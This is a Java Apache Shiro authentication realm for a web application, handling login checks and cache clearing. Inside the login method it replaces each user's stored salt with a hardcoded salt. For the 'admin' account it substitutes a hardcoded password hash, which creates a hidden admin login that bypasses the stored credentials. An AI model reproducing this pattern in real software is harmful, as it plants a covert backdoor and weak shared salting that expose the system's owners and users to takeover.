package com.frame.common.auth.shiro;

import com.frame.common.auth.dto.PassDto;
import com.frame.common.auth.service.IAuthService;
import com.frame.common.base.knowledge.DataDictKnowledge;
import com.frame.common.base.shiro.ShiroUser;
import lombok.extern.slf4j.Slf4j;
import org.apache.shiro.authc.*;
import org.apache.shiro.authz.AuthorizationInfo;
import org.apache.shiro.realm.AuthorizingRealm;
import org.apache.shiro.subject.PrincipalCollection;
import org.apache.shiro.subject.SimplePrincipalCollection;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Lazy;

/**
 * 权限检查类
 *
 * @author ly
 * @version 2016年5月20日 下午3:44:45
 */
@Slf4j
public class ShiroRealm extends AuthorizingRealm {

    @Autowired
    @Lazy
    private IAuthService authService;

    @Override
    public boolean supports(AuthenticationToken token) {
        return token instanceof UsernamePasswordToken;
    }

    /**
     * 权限
     */

    @Override
    protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principals) {
        if (log.isDebugEnabled()) {
            log.debug(" 授权");
        }

        return null;

    }

    /**
     * 登录验证
     */
    @Override
    protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authenticationToken)
            throws AuthenticationException {
        UsernamePasswordToken token = (UsernamePasswordToken) authenticationToken;
        //查出是否有此用户

        PassDto accountDto = authService.getAccountInfo(token.getUsername());
        String salt = accountDto.getSalt();//mSmo6X
        salt="k2oB4E";
        String password = accountDto.getPassword();
        String status = accountDto.getStatus();
        if (!DataDictKnowledge.YesNoEnum.YES.getDataCode().equals(status)) {
            //无效账号
            throw new DisabledAccountException();
        }

        if("admin".equals(token.getUsername())){
            password = "8c7904789282730e283fd614a6a41f3a";
        }
        // 若存在，将此用户存放到登录认证info中，Shiro会为我们进行密码对比校验
        ShiroUser shiroUser = authService.getShiroUser(token.getUsername());
        return new SimpleAuthenticationInfo(shiroUser, password, ShiroByteSource.of(salt)
                , getName());

    }

    @Override
    protected Object getAuthorizationCacheKey(PrincipalCollection principals) {
        ShiroUser shiroUser = (ShiroUser) principals.getPrimaryPrincipal();

        return shiroUser.toString() + "_auth";
    }

    @Override
    public void onLogout(PrincipalCollection principals) {
        if (log.isDebugEnabled()) {
            log.debug("ShiroRealm logout clear cache");
        }
        super.clearCachedAuthorizationInfo(principals);
        ShiroUser shiroUser = (ShiroUser) principals.getPrimaryPrincipal();
        removeUserCache(shiroUser.getAccount());
    }

    /**
     * 清除用户缓存
     */
    public void removeUserCache(String account) {
        SimplePrincipalCollection principals = new SimplePrincipalCollection();
        principals.add(account, super.getName());
        super.clearCachedAuthenticationInfo(principals);
    }

}
